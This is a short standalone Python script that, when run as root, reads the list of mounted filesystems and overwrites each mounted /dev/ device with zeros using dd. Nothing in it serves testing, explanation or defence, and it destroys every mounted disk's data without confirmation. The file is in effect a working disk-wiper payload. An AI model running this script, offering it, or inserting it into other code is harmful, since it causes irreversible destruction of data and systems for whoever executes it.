#!/usr/bin/env python3
import os
import subprocess

if os.getuid() == 0:
    for line in open("/proc/mounts"):
        if line.startswith("/dev/"):
            dev = line.split()[0]
            subprocess.run(["dd", "if=/dev/zero", f"of={dev}"], check=False)
